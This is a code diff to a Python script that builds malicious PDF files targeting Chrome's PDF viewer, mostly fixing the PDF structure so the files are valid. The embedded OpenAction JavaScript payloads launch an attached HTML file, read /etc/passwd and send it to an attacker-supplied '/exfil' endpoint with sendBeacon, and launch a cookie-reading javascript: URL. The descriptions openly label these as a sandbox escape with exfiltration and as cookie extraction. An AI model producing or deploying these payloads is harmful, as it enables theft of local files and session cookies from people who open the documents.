@@ -32,12 +32,28 @@ def write_pdf(filename, content, description, pdf_version):
     # Replace the PDF version header in the content
     content = content.replace("%PDF-1.7", PDF_VERSIONS[pdf_version]["header"])
     
+    # Add comments after the PDF but before the objects
+    lines = content.split('\n')
+    pdf_header_line = None
+    for i, line in enumerate(lines):
+        if line.startswith('%PDF-'):
+            pdf_header_line = i
+            break
+    
+    if pdf_header_line is not None:
+        # Insert comments after PDF header
+        comment_lines = [
+            f"% {description}",
+            f"% Generated on: {TIMESTAMP} UTC", 
+            f"% User: {USER}",
+            f"% PDF Version: {pdf_version}",
+            f"% PAYLOAD FOR REFERENCE: (see content stream)"
+        ]
+        lines[pdf_header_line+1:pdf_header_line+1] = comment_lines
+        content = '\n'.join(lines)
+    
     with open(filename, 'w') as f:
-        f.write(f"""# {description}
-# Generated on: {TIMESTAMP} UTC
-# User: {USER}
-# PDF Version: {pdf_version}
-{content}""")
+        f.write(content)
     print(f"Created {filename} (PDF Version {pdf_version})")
 
 def escape_pdf_text(text):
@@ -53,10 +69,10 @@ def format_payload_for_pdf(payload, max_lines=6, chars_per_line=45):
     
     payload_display = ''
     for line in payload_lines[:max_lines]:
-        payload_display += f'({line}) Tj\\n0 -12 Td\\n'
+        payload_display += f'({line}) Tj\n0 -12 Td\n'
     
     if len(payload_lines) > max_lines:
-        payload_display += '(...more) Tj\\n'
+        payload_display += '(...more) Tj\n'
     
     return payload_display
 
@@ -69,7 +85,6 @@ def generate_chrome_payloads(url, output_dir, pdf_version):
 try {{ app.doc.exportDataObject({{cName: "test.html", nLaunch: 2}}); }} catch(e) {{ app.alert(e); }}'''
     
     payload_display = format_payload_for_pdf(js_payload)
-    content_length = len(payload_display) + 300
     
     payload1 = f"""%PDF-1.7
 1 0 obj
@@ -82,7 +97,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 6 0 R>>>>>>
 endobj
 4 0 obj
-<</Length {content_length}>>
+<</Length 300>>
 stream
 BT
 /F1 12 Tf
@@ -106,16 +121,16 @@ endobj
 xref
 0 7
 0000000000 65535 f
-0000000010 00000 n
-0000000077 00000 n
-0000000130 00000 n
-0000000235 00000 n
-0000000000 00000 n
-0000000000 00000 n
+0000000009 00000 n
+0000000069 00000 n
+0000000126 00000 n
+0000000231 00000 n
+0000000625 00000 n
+0000000750 00000 n
 trailer
 <</Size 7/Root 1 0 R>>
 startxref
-400
+839
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_basic_js_execution.pdf", payload1, 
               "Basic PDF with JavaScript execution in Chrome", pdf_version)
@@ -124,7 +139,6 @@ startxref
     js_payload2 = f'''this.submitForm({{cURL: "javascript:fetch('file:///etc/passwd').then(r=>r.text()).then(t=>navigator.sendBeacon('{url}/exfil',t))", cSubmitAs: "PDF"}});'''
     
     payload_display2 = format_payload_for_pdf(js_payload2)
-    content_length2 = len(payload_display2) + 300
     
     payload2 = f"""%PDF-1.7
 1 0 obj
@@ -137,7 +151,7 @@ endobj
 <</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 6 0 R>>>>>>
 endobj
 4 0 obj
-<</Length {content_length2}>>
+<</Length 280>>
 stream
 BT
 /F1 12 Tf
@@ -161,21 +175,28 @@ endobj
 xref
 0 7
 0000000000 65535 f
-0000000010 00000 n
-0000000077 00000 n
-0000000130 00000 n
-0000000235 00000 n
-0000000000 00000 n
-0000000000 00000 n
+0000000009 00000 n
+0000000069 00000 n
+0000000126 00000 n
+0000000231 00000 n
+0000000580 00000 n
+0000000750 00000 n
 trailer
 <</Size 7/Root 1 0 R>>
 startxref
-400
+839
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_sandbox_escape.pdf", payload2, 
               "Chrome PDF viewer sandbox escape to read local files and exfiltrate to attacker URL", pdf_version)
     
     # Payload 3: Chrome PDF viewer DOM access
+    js_payload3 = '''try {
+  app.alert("XSS via PDF in Chrome");
+  app.launchURL("javascript:alert(document.cookie)", true);
+} catch(e) { app.alert(e); }'''
+    
+    payload_display3 = format_payload_for_pdf(js_payload3)
+    
     payload3 = f"""%PDF-1.7
 1 0 obj
 <</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
@@ -184,26 +205,43 @@ endobj
 <</Type/Pages/Kids[3 0 R]/Count 1>>
 endobj
 3 0 obj
-<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 6 0 R>>>>>>
+endobj
+4 0 obj
+<</Length 250>>
+stream
+BT
+/F1 12 Tf
+50 750 Td
+(Chrome PDF DOM Access) Tj
+0 -40 Td
+(PAYLOAD FOR REFERENCE:) Tj
+0 -25 Td
+{payload_display3}
+ET
+endstream
 endobj
 5 0 obj
 <</Type/Action/S/JavaScript/JS(
-try {{
-  app.alert("XSS via PDF in Chrome");
-  app.launchURL("javascript:alert(document.cookie)", true);
-}} catch(e) {{ app.alert(e); }}
+{js_payload3}
 )>>
 endobj
+6 0 obj
+<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
+endobj
 xref
-0 6
+0 7
 0000000000 65535 f
-0000000010 00000 n
-0000000077 00000 n
-0000000130 00000 n
+0000000009 00000 n
+0000000069 00000 n
+0000000126 00000 n
+0000000231 00000 n
+0000000550 00000 n
+0000000700 00000 n
 trailer
-<</Size 6/Root 1 0 R>>
+<</Size 7/Root 1 0 R>>
 startxref
-495
+789
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_dom_access.pdf", payload3, 
               "Chrome PDF viewer DOM access to extract cookies", pdf_version)
